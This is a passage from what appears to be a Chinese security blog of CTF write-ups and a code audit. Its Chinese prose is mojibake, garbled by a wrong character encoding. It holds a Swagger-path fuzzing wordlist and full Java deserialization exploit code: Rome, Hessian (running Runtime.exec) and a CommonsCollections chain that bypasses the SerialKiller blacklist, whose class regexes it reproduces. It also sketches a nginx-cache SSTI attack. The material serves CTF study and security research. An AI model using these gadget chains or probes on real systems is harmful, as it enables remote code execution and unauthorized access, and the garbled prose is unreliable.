æœªæˆæƒè®¿é—®æ¼æ´ï¼šå®Œå–„åˆ†æä¸è§£å†³æ–¹æ¡ˆ-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº (aliyun.com) ç›¸å…³è·¯å¾„ï¼Œåœ¨å®é™…æµ‹è¯•å·¥ç¨‹ä¸­å¯ç”¨ä»¥ä¸‹å­—å…¸fuzz /api/api-docs/api-docs/swagger.json/api.html/api/api-docs/api/apidocs/api/doc/api/swagger/api/swagger-ui/api/swagger-ui.html/api/swagger-ui.html//api/swagger-ui.json/api/swagger.json/api/swagger//api/swagger/ui/api/swagger/ui//api/swaggerui/api/swaggerui//api/v1//api/v1/api-docs/api/v1/apidocs/api/v1/swagger/api/v1/swagger-ui/api/v1/swagger-ui.html/api/v1/swagger-ui.json/api/v1/swagger.json/api/v1/swagger//api/v2/api/v2/api-docs/api/v2/apidocs/api/v2/swagger/api/v2/swagger-ui/api/v2/swagger-ui.html/api/v2/swagger-ui.json/api/v2/swagger.json/api/v2/swagger//api/v3/apidocs/apidocs/swagger.json/doc.html/docs//druid/index.html/graphql/libs/swaggerui/libs/swaggerui//spring-security-oauth-resource/swagger-ui.html/spring-security-rest/api/swagger-ui.html/sw/swagger-ui.html/swagger/swagger-resources/swagger-resources/configuration/security/swagger-resources/configuration/security//swagger-resources/configuration/ui/swagger-resources/configuration/ui//swagger-ui/swagger-ui.html/swagger-ui.html#/api-memory-controller/swagger-ui.html//swagger-ui.json/swagger-ui/swagger.json/swagger.json/swagger.yml/swagger//swagger/index.html/swagger/static/index.html/swagger/swagger-ui.html/swagger/ui//Swagger/ui/index/swagger/ui/index/swagger/v1/swagger.json/swagger/v2/swagger.json/template/swagger-ui.html/user/swagger-ui.html/user/swagger-ui.html//v1.x/swagger-ui.html/v1/api-docs/v1/swagger.json/v2/api-docs/v3/api-docs ç°åœ¨çœ‹ä¸€æ‰‹å…³äºå®ƒçš„é…ç½®æ–‡ä»¶Swagger2Config.java @Configuration@EnableSwagger2public class Swagger2Config @Bean public Docket createRestApi() return new Docket(DocumentationType.SWAGGER_2) .apiInfo(this.apiInfo()) .select() .apis(RequestHandlerSelectors.any()) .paths(PathSelectors.any()) .build(); private ApiInfo apiInfo() return new ApiInfoBuilder() .title(ç®¡ä¼Šä½³ERP Restful Api) .description(ç®¡ä¼Šä½³ERPæ¥å£æè¿°) .termsOfServiceUrl(http://127.0.0.1) .contact(new Contact(jishenghua, , )) .version(3.0) .build(); åœ¨è¯¥ç±»åŠé…ç½®æ–‡ä»¶ä¸­æœªè¿›è¡Œä»»ä½•çš„é™åˆ¶åŠè®¿é—®æ§åˆ¶å’Œèº«ä»½éªŒè¯ï¼Œå› æ­¤å¯¼è‡´åœ¨æœªç™»å½•çš„æƒ…å†µä¸‹èƒ½å¤Ÿè¯·æ±‚å¾—åˆ°apiæ¥å£ å£°æ˜ æ³•å¾‹ä¸é“å¾·å£°æ˜ æœ¬æ–‡æ‰€è¿°æ¼æ´ä¿¡æ¯ä»…ä¾›æŠ€æœ¯ç ”ç©¶ä¸é˜²å¾¡å‚è€ƒ ä»»ä½•ä¸ªäººç»„ç»‡ä¸å¾—å°†æ¼æ´ç”¨äºéæ³•ç›®çš„ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šæœªæˆæƒæ¸—é€ã€æ•°æ®çªƒå–ã€ç³»ç»Ÿç ´å ä½œè€…å¼ºçƒˆè°´è´£æ¶æ„åˆ©ç”¨è¡Œä¸ºï¼Œå¯¹å› æ»¥ç”¨æœ¬æ–‡ä¿¡æ¯å¯¼è‡´çš„æŸå¤±ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹è´£ä»» æœ¬æ–‡æ‰€æ¶‰åŠåˆ°çš„è¾ƒä¸ºä¸¥é‡çš„æ´é¡¹ç›®å¼€å‘è€…å·²åšä¿®å¤ï¼Œå‘æ–‡ä¹Ÿå·²å–å¾—å¼€å‘è€…åŒæ„","categories":["ä»£ç å®¡è®¡"]},{"title":"CTF-javaä¸“é¢˜","path":"/2025/07/20/CTF-javaä¸“é¢˜/","content":"2022-é•¿åŸæ¯-b4bycoffeeé¦–å…ˆçœ‹è¯¥é¢˜çš„ä¾èµ–ï¼Œå‘ç°romeç‰ˆæœ¬ä¸º1.7ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ æ³¨æ„åˆ°com.example.bab4coffee.toolsç›®å½•ä¸‹é¢è‡ªå·±å†™äº†ä¸€ä¸ªInputSteam public class AntObjectInputStream extends ObjectInputStream private ListString list = new ArrayList(); public AntObjectInputStream(InputStream inputStream) throws IOException super(inputStream); this.list.add(BadAttributeValueExpException.class.getName()); this.list.add(ObjectBean.class.getName()); this.list.add(ToStringBean.class.getName()); this.list.add(TemplatesImpl.class.getName()); this.list.add(Runtime.class.getName()); protected Class? resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException if (this.list.contains(desc.getName())) throw new InvalidClassException(Unauthorized deserialization attempt, desc.getName()); else return super.resolveClass(desc); é‡å†™äº†resolveClasså¹¶ä¸”å®šä¹‰äº†ä¸€ä¸ªé»‘åå•ï¼Œä½†ç†Ÿæ‚‰romeååºåˆ—åŒ–æ¼æ´çš„æœ‹å‹éƒ½çŸ¥é“è¿˜æœ‰ä¸€ä¸ªç±»æ²¡è¢«ç¦æ‰ï¼Œé‚£å°±æ˜¯EqualsBeanï¼Œä½†æ˜¯åé¢çš„TOStringBeanç»™ç¦æ‰äº† å¾ˆå¹¸è¿ï¼Œåœ¨ç¿»æ–‡ä»¶çš„æ—¶å€™çœ‹åˆ°äº†CoffeeBeanï¼Œè¯¥ç±»ä¸­æœ‰ä¸€ä¸ªtoString()æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥åŠ è½½å­—èŠ‚ç ï¼Œå…è®¸ä»»æ„ç±»åˆå§‹åŒ– è¿™å°±ç›¸å½“äºä¸€ä¸ªç±»ç›´æ¥æ›¿ä»£æ‰äº†ä¹‹å‰é“¾å­ä¸­çš„ToStringBeanå’ŒTemplatesImpl æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„è¿™æ¡é“¾å­ java.util.HashMap#readObjectjava.util.HashMap#hashcom.rometools.rome.feed.impl.EqualsBean#hashCodecom.rometools.rome.feed.impl.EqualsBean#beanHashCodecom.example.b4bycoffee.model.CoffeeBean#toString pocè¿™é‡Œå°±ä¸ç»™äº†ï¼Œæ¯”è¾ƒç®€å• import com.example.b4bycoffee.model.CoffeeBean;import com.example.b4bycoffee.tools.AntObjectInputStream;import com.rometools.rome.feed.impl.EqualsBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.InputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Hashtable;public class exploit public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception Field field = obj.getClass().getDeclaredField(fieldname); field.setAccessible(true); field.set(obj,value); public static void main(String[] args) throws Exception CoffeeBean toStringBean = new CoffeeBean(); Class c = toStringBean.getClass(); Field classByteField = c.getDeclaredField(ClassByte); classByteField.setAccessible(true); byte[] bytes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); classByteField.set(toStringBean,bytes); EqualsBean bean = new EqualsBean(String.class,a); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(yy,bean); map1.put(zZ,toStringBean); map2.put(zZ,bean); map2.put(yy,toStringBean); Hashtable table = new Hashtable(); table.put(map1,1); table.put(map2,2); setFieldValue(bean,beanClass,CoffeeBean.class); setFieldValue(bean,obj,toStringBean); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(table); oos.close(); System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));// InputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(new String(Base64.getEncoder().encode(baos.toByteArray()))));// AntObjectInputStream antInputStream = new AntObjectInputStream(inputStream);// antInputStream.readObject(); åŠ è½½Springå›æ˜¾ç±»å³å¯ï¼Œæ³¨æ„è¿™é‡Œä¼ å‚æ–¹å¼æ˜¯@RequestBody CoffeeRequest coffeeï¼Œéœ€è¦ä½¿ç”¨jsonä¼  Hessian_only_jdkè¯¥é¢˜è€ƒçš„å°±æ˜¯hessian_jdkåŸç”Ÿé“¾ï¼Œä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆé»‘åå•å•¥çš„ï¼Œä¸»è¦çš„ä»£ç å°±æ˜¯ä¸‹é¢çš„è¿™ä¸ªindex package com.ctf.hessian.onlyJdk;import com.caucho.hessian.io.Hessian2Input;import com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.InetSocketAddress;import java.util.concurrent.Executors;public class Index public Index() public static void main(String[] args) throws Exception System.out.println(server start); HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0); server.createContext(/, new MyHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); static class MyHandler implements HttpHandler MyHandler() public void handle(HttpExchange t) throws IOException String response = Welcome to 0CTF 2022!; InputStream is = t.getRequestBody(); try Hessian2Input input = new Hessian2Input(is); input.readObject(); catch (Exception var5) Exception e = var5; e.printStackTrace(); response = oops! something is wrong; t.sendResponseHeaders(200, (long)response.length()); OutputStream os = t.getResponseBody(); os.write(response.getBytes()); os.close(); å°±æ˜¯å¯¹æ¥æ”¶åˆ°çš„è¯·æ±‚ä½“è¿›è¡Œä¸€ä¸ªhessianååºåˆ—åŒ–çš„æ“ä½œ ç„¶åæˆ‘ä»¬çœ‹é…ç½®æ–‡ä»¶ä¸­çš„hessianç‰ˆæœ¬ä¸º4.0.38ï¼Œä½äº4.0.60ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ä¸ŠRuntimeçš„é‚£ä¸ªexpæ¥è§£å†³é¢˜ç›® éœ€è¦æ³¨æ„çš„æ˜¯è¯¥é¢˜çš„è¯·æ±‚ä½“ç›´æ¥ä¼ ä¸è¿›å»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±å†™ä¸ªä»£ç æ„é€ è¯·æ±‚ä¼ è¿›å» pocå¦‚ä¸‹ï¼š import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.reflect.ReflectionFactory;import sun.reflect.misc.MethodUtil;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.OutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.HttpURLConnection;import java.net.URL;import java.util.Base64;public class Poc public static void main(String[] args) throws Exception Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class); Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class);// MethodUtil.invoke(invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); defaults.put(666,swingLazyValue); setField(mimeTypeParameterList,parameters,defaults);// System.out.println(mimeTypeParameterList); String s = ser(mimeTypeParameterList);// System.out.println(Base64.getDecoder().decode(s));// unser(s); byte[] bytes = Base64.getDecoder().decode(s); // å‘é€è¯·æ±‚ URL url = new URL(http://127.0.0.1:8090/); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setDoOutput(true); conn.setRequestMethod(POST); OutputStream os = conn.getOutputStream(); os.write(bytes); os.flush(); os.close(); System.out.println(Response code: + conn.getResponseCode()); public static Object unser(String string) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); Object obj = hessian2Input.readObject(); return obj; public static String ser(Object object) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); hessian2Output.getSerializerFactory().setAllowNonSerializable(true); byteArrayOutputStream.write(67); hessian2Output.writeObject(object); hessian2Output.flushBuffer(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static T T createObjWithoutConstructor(ClassT clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return (T) constructor1.newInstance(); 2022-0ctf-3rm1è¯¥é¢˜jdkç‰ˆæœ¬ä¸º201 å¹²äº†ä¸€å¤©æ˜¯åœ¨æ˜¯åšä¸å‡ºæ¥ï¼Œç½‘ä¸Šå…³äºè¯¥é¢˜çš„wpä¸å¤šï¼Œçœ‹çš„æˆ‘ä¹Ÿè¿·è¿·ç³Šç³Šçš„ï¼Œå°±ä¸åœ¨è¿™é‡ŒçŒ®ä¸‘äº† æˆ‘è‡ªå·±çš„è¿›åº¦æ˜¯åœ¨çŸ¥é“è¯¥é¢˜çš„ç›®çš„å°±æ˜¯æˆ‘ä»¬å¿…é¡»è¿œç¨‹ç»‘å®šä¸€ä¸ªæ¶æ„å¯¹è±¡åˆ°æ³¨å†Œä¸­å¿ƒä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¿…é¡»æ‘†è„±registryé»˜è®¤åªèƒ½æœ¬åœ°ç»‘å®šçš„é™åˆ¶ï¼Œè¿™é‡Œçš„è¯å¯ä»¥ç”¨å·¥å…·ï¼šhttps://github.com/qtc-de/remote-method-guesser è¯¥å·¥å…·å¯ä»¥å’Œysoserialå·¥å…·è”åŠ¨éªŒè¯ç¡®å®æ˜¯è¯¥æ€è·¯ï¼Œç”¨URLDNSé“¾æ¥éªŒè¯ åé¢å°±æ˜¯æˆ‘ä»¬å¿…é¡»æ‰¾ä¸€ä¸ªå¯ä»¥rceçš„é“¾å­ï¼Œçœ‹é¢˜ç›®è‡ªå·±æä¾›çš„é‚£äº›ç±»å¾ˆç†Ÿæ‚‰ï¼ŒåŸºæœ¬å°±æ˜¯ç…§ç€spring1çš„é“¾å­æ‰€éœ€è¦çš„ç±»è‡ªå·±å†å†™ä¸€éçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¶å®ç…§ç€æ”¹ä¸€æ”¹å°±å¯ä»¥äº† è¿™å½“ç„¶æ˜¯é™åœ¨ä½ç‰ˆæœ¬ä¸Šï¼Œé«˜ç‰ˆæœ¬AnnotationInvocationHandlerå·²ç»è¢«ç§»é™¤äº†ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼äºAnnotationInvocationHandlerçš„ä»£ç†ç±» å¾ˆå¥½ï¼Œç„¶åå°±æ²¡ç„¶åäº†ï¼Œå¡æ­»åœ¨è¿™é‡Œäº†ï¼Œçœ‹wpé‡Œé¢æ˜¯åˆ©ç”¨codeqlæ¥è¿›è¡Œä¸€ä¸ªå¯»æ‰¾ï¼ˆè¿˜æ²¡å­¦ã€‚ã€‚ã€‚ï¼‰ è¯´å®è¯é‚£ä¸ªé“¾å­æ„é€ ç›®å‰çœ‹çš„ä¹Ÿæ‡µæ‡µçš„ï¼Œåé¢æœ‰æœºä¼šå†æ¥å¤ç›˜ä¸€æ‰‹ 2022MRCTF-easyjavaé¢˜ç›®ç¯å¢ƒï¼šhttps://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF/%E7%BB%95serializeKiller ä¸»è¦å…³æ³¨ä¸‹é¢è¿™ä¸ªæ–‡ä»¶ package com.example.easyjava.controller;import java.io.ByteArrayInputStream;import java.io.ObjectInputStream;import java.util.Base64;import org.nibblesec.tools.SerialKiller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestBody;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class HelloController public HelloController() @GetMapping(/hello) public String index() return hello; @PostMapping(/hello) public String index(@RequestBody String baseStr) throws Exception byte[] decode = Base64.getDecoder().decode(baseStr); ObjectInputStream ois = new SerialKiller(new ByteArrayInputStream(decode), serialkiller.xml); ois.readObject(); return hello; åœ¨SerialKillerç±»ä¸­åšäº†è¿‡æ»¤ï¼Œè·Ÿè¿›å»æ˜¯é€šè¿‡resolveClassæ¥è¿›è¡Œè¿‡æ»¤æ“ä½œ protected Class? resolveClass(ObjectStreamClass var1) throws IOException, ClassNotFoundException String[] var2 = blacklist; int var3 = var2.length; int var4; for(var4 = 0; var4 var3; ++var4) String var5 = var2[var4]; Pattern var6 = Pattern.compile(var5); Matcher var7 = var6.matcher(var1.getName()); if (var7.find()) if (!profiling) LOGGER.log(Level.SEVERE, Blocked by blacklist 0. Match found for 1, new Object[]var5, var1.getName()); throw new InvalidClassException(Class blocked by SK: + var1.getName() + ); LOGGER.log(Level.FINE, Blacklist match: 0, var1.getName()); boolean var9 = false; String[] var10 = whitelist; var4 = var10.length; for(int var11 = 0; var11 var4; ++var11) String var12 = var10[var11]; Pattern var13 = Pattern.compile(var12); Matcher var8 = var13.matcher(var1.getName()); if (var8.find()) var9 = true; if (profiling) LOGGER.log(Level.FINE, Whitelist match: 0, var1.getName()); if (!var9 !profiling) LOGGER.log(Level.SEVERE, Blocked by whitelist. No match found for 0, var1.getName()); throw new InvalidClassException(Class blocked by SK: + var1.getName() + ); else return super.resolveClass(var1); é»‘åå•å’Œç™½åå•çš„å†…å®¹æ˜¯æ ¹æ®serialkiller.xmlæ¥è¿›è¡Œæ·»åŠ çš„ blacklist !-- ysoserials CommonsCollections1,3,5,6 payload -- regexporg\\.apache\\.commons\\.collections\\.Transformer$/regexp regexporg\\.apache\\.commons\\.collections\\.functors\\.InvokerTransformer$/regexp regexporg\\.apache\\.commons\\.collections\\.functors\\.ChainedTransformer$/regexp regexporg\\.apache\\.commons\\.collections\\.functors\\.ConstantTransformer$/regexp regexporg\\.apache\\.commons\\.collections\\.functors\\.InstantiateTransformer$/regexp !-- ysoserials CommonsCollections2,4 payload -- regexporg\\.apache\\.commons\\.collections4\\.functors\\.InvokerTransformer$/regexp regexporg\\.apache\\.commons\\.collections4\\.functors\\.ChainedTransformer$/regexp regexporg\\.apache\\.commons\\.collections4\\.functors\\.ConstantTransformer$/regexp regexporg\\.apache\\.commons\\.collections4\\.functors\\.InstantiateTransformer$/regexp regexporg\\.apache\\.commons\\.collections4\\.comparators\\.TransformingComparator$/regexp/blacklistwhitelist regexp.*/regexp/whitelist å¯ä»¥çœ‹åˆ°é»‘åå•åŸºæœ¬æŠŠysoçš„ccé“¾ä¸­çš„è·Ÿtransformæ–¹æ³•æœ‰å…³çš„ç±»å…¨éƒ¨éƒ½ç¦æ‰äº†ï¼Œä½†æ˜¯é™¤äº†è¿™å‡ ä¸ªç±»å¤–å‰©ä¸‹çš„ç±»éƒ½åœ¨ç™½åå•ä¹‹ä¸­ å¯ä»¥è¿›è¡Œä»»æ„ç±»åŠ è½½çš„TemplatesImplç±»æ²¡æœ‰è¢«ç¦æ‰ï¼ŒæŸ¥çœ‹æµç¨‹å›¾æˆ‘ä»¬æ˜ç™½å¯ä»¥å’ŒLazyMapçš„getæ–¹æ³•æ¥è¿›è¡Œé…åˆï¼Œå¦‚ä¸‹å›¾ï¼š æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å†æ‰¾ä¸€ä¸ªæ–°çš„ç±»ï¼ŒåŒ…å«æœ‰transformæ–¹æ³•ï¼Œå¹¶ä¸”æœ€åå¯ä»¥è§¦å‘Constructor.newInstance ç¼–å†™qlæŸ¥è¯¢ä»£ç å¦‚ä¸‹ï¼š /** * @id java/examples/demo * @name easyjava * @description path-problem * @kind path-problem * @problem.severity warning */import javaclass NewInstanceCall extends Call NewInstanceCall() this.getCallee().getDeclaringType() instanceof TypeConstructor and this.getCallee().hasName(newInstance) and not this.getCaller().getDeclaringType().hasName(InvokerTransformer) and not this.getCaller().getDeclaringType().hasName(ChainedTransformer) and not this.getCaller().getDeclaringType().hasName(ConstantTransformer) and not this.getCaller().getDeclaringType().hasName(InstantiateTransformer) class GetterCallable extends Callable GetterCallable() this.getName().matches(transform) and not this.getDeclaringType() instanceof Interface and this.fromSource() and this.getNumberOfParameters() = 1 and not this.getDeclaringType().hasName(InvokerTransformer) and not this.getDeclaringType().hasName(ChainedTransformer) and not this.getDeclaringType().hasName(ConstantTransformer) and not this.getDeclaringType().hasName(InstantiateTransformer) query predicate edges(Callable a, Callable b) a.polyCalls(b) from NewInstanceCall endcall, GetterCallable entryPoint,Callable endCallAblewhere endcall.getCallee() = endCallAble and edges+(entryPoint, endCallAble)select endcall.getCaller(), entryPoint, endcall.getCaller(), cc finder è¿è¡Œåä»ç»“æœæ‰‹åŠ¨è¿›è¡Œç­›é€‰ï¼Œé€‰ä¸­FactoryTransformerç±»çš„transformæ–¹æ³• ä¸InstantiateFactoryçš„createæ–¹æ³•è¿›è¡Œé…åˆï¼Œå®ç°ä»»æ„ç±»åŠ è½½ äºæ˜¯æˆ‘ä»¬çš„Pocä¾¿å¦‚ä¸‹æ‰€ç¤ºï¼š import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.FactoryTransformer;import org.apache.commons.collections.functors.InstantiateFactory;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.nibblesec.tools.SerialKiller;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); public static void main(String[] args) throws Exception TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, _bytecodes, new byte[][] ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode() ); setFieldValue(obj, _name, 1); setFieldValue(obj, _tfactory, new TransformerFactoryImpl()); InstantiateFactory instantiateFactory; instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class ,new Class[]javax.xml.transform.Templates.class,new Object[]obj); FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory); ConstantTransformer constantTransformer = new ConstantTransformer(1); Map innerMap = new HashMap(); LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer); TiedMapEntry tme = new TiedMapEntry(outerMap, keykey); Map expMap = new HashMap(); expMap.put(tme, valuevalue); setFieldValue(outerMap,factory,factoryTransformer); outerMap.remove(keykey); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(expMap); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream ois = new SerialKiller(byteArrayInputStream, E:\\\\matches\\\\usual_ctf\\\\ezjava\\\\serialkiller.xml); ois.readObject();","categories":["Write-Up"]},{"title":"L3HCTF-2025webé¢˜è§£","path":"/2025/07/17/L3HCTF-2025webé¢˜è§£/","content":"best_profileé¦–å…ˆæˆ‘ä»¬å…ˆåˆ†ænginx.confçš„ä»£ç  http include mime.types; default_type text/html; access_log off; error_log /dev/null; sendfile on; keepalive_timeout 65; proxy_cache_path /cache levels=1:2 keys_zone=static:20m inactive=24h max_size=100m; server listen 80 default_server; location / proxy_pass http://127.0.0.1:5000; location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ proxy_ignore_headers Cache-Control Expires Vary Set-Cookie; proxy_pass http://127.0.0.1:5000; proxy_cache static; proxy_cache_valid 200 302 30d; location ~ .*\\.(js|css)?$ proxy_ignore_headers Cache-Control Expires Vary Set-Cookie; proxy_pass http://127.0.0.1:5000; proxy_cache static; proxy_cache_valid 200 302 12h; ä¸»è¦çš„å°±æ˜¯å¯¹é™æ€èµ„æºï¼ˆå›¾ç‰‡ã€JSã€CSSï¼‰è¿›è¡Œç¼“å­˜å¤„ç†ï¼ŒæˆåŠŸç¼“å­˜çš„æ—¶é—´ä¸º30å¤© çœ‹é™æ€æ–‡ä»¶last_ip.htmlä¸­å­˜åœ¨sstiæ³¨å…¥çš„ç‚¹ body div class=header h1Facebook/h1 a href=/profileProfile/a /div div class=content-container h2Last Login IP/h2 p last_ip /p /div/body åˆ°app.pyä¸­çœ‹å“ªå—ä»£ç æ¸²æŸ“äº†æ”¹é™æ€æ–‡ä»¶ @app.route(/get_last_ip/string:username, methods=[GET, POST])def route_check_ip(username): if not current_user.is_authenticated: return You need to login first. user = User.query.filter_by(username=username).first() if not user: return User not found. return render_template(last_ip.html, last_ip=user.last_ip)@app.route(/ip_detail/string:username, methods=[GET])def route_ip_detail(username): res = requests.get(fhttp://127.0.0.1/get_last_ip/username) if res.status_code != 200: return Get last ip failed. last_ip = res.text try: ip = re.findall(r\\d+\\.\\d+\\.\\d+\\.\\d+, last_ip) country = geoip2_reader.country(ip) except (ValueError, TypeError): country = Unknown template = f h1IP Detail/h1 divlast_ip/div pCountry:country/p return render_template_string(template) å¯ä»¥çŸ¥é“æ˜¯é€šè¿‡route_check_ipæ–¹æ³•æ¥æ¸²æŸ“last_ip.htmlï¼Œç„¶åå†route_ip_detailæ–¹æ³•ä¸­è·å–ï¼Œå¹¶é€šè¿‡render_template_stringæ–¹æ³•æ¥è¿›è¡Œæ¸²æŸ“ è€Œrender_template_stringæ–¹æ³•ç”±äºæ˜¯ç›´æ¥æ¸²æŸ“è¾“å…¥çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œå› è€Œå­˜åœ¨å®‰å…¨éšæ‚£ è¿™é‡Œæœ‰ä¸€ä¸ªé‡è¦çš„ç»†èŠ‚ï¼š route_ip_detail ä½¿ç”¨ requests.get() å‘é€è¯·æ±‚åˆ° http://127.0.0.1/get_last_ip/username è¿™æ˜¯ä¸€ä¸ªå…¨æ–°çš„ HTTP è¯·æ±‚ï¼Œä¸å½“å‰ç”¨æˆ·çš„ä¼šè¯å®Œå…¨ç‹¬ç«‹ è¿™ä¸ªæ–°è¯·æ±‚ä¸ä¼šæºå¸¦åŸæœ‰çš„ç”¨æˆ·è®¤è¯ä¿¡æ¯ æ‰€ä»¥å³ä½¿ç”¨æˆ·å·²ç»ç™»å½•ï¼š å½“ç›´æ¥è®¿é—® /get_last_ip/username æ—¶ä¼šæ­£å¸¸æ˜¾ç¤º last_ip ä½†é€šè¿‡ /ip_detail/username è®¿é—®æ—¶ä¼šè¿”å› â€œYou need to login firstâ€ è¿™æ˜¯å› ä¸ºï¼š ç”¨æˆ·çš„ç™»å½•çŠ¶æ€å­˜å‚¨åœ¨ä¼šè¯ï¼ˆsessionï¼‰ä¸­ requests.get() åˆ›å»ºäº†æ–°çš„ HTTP è¯·æ±‚ï¼Œæ²¡æœ‰æºå¸¦åŸæœ‰çš„ä¼šè¯ä¿¡æ¯ æ‰€ä»¥ /get_last_ip/username æ¥å£ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæœªç™»å½•çš„è¯·æ±‚ ç„¶åæˆ‘ä»¬çœ‹æ³¨å†Œç™»å½•å¤„å¹¶æ²¡æœ‰é™åˆ¶è´¦å·åï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è´¦å·åè®¾ä¸º.jpgç­‰åç¼€æ¥å®ç°æˆåŠŸç¼“å­˜ï¼Œç„¶ååœ¨ requests.get() è®¿é—®çš„æ—¶å€™ä¾¿å¯ä»¥è·å–åˆ°å·²ç»ç¼“å­˜çš„é™æ€æ–‡ä»¶å†…å®¹äº† è€Œlast_ipçš„å€¼æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¯·æ±‚å¤´X-Forwarded-Foræ¥è·å– é¦–å…ˆæˆ‘ä»¬å…ˆè¿›è¡Œæ³¨å†Œ ç™»å½• æŠŠç™»å½•è·å–åˆ°çš„sessionè¿›è¡Œå¤åˆ¶ï¼Œè®¿é—®get_last_ipè·¯ç”± å¯ä»¥çœ‹åˆ°è·å–åˆ°çš„last_ipå€¼å°±æ˜¯æˆ‘ä»¬è¾“å…¥è¿›å»çš„å†…å®¹ï¼Œåˆ«æ€¥ï¼Œè¿™è¿˜æ²¡ç»è¿‡render_template_stringæ–¹æ³•çš„æ¸²æŸ“ æ¥ä¸‹æ¥æ‹¿ç€è¿™ä¸ªsessionç»§ç»­è®¿é—®ip_detailè·¯ç”± æ¸²æŸ“æˆåŠŸï¼Œè¯æ˜ç¡®å®æ˜¯å­˜åœ¨ssti å‰©ä¸‹çš„æ­¥éª¤å°±æ˜¯å¥—payloadè¿›å»å°±æ˜¯äº† 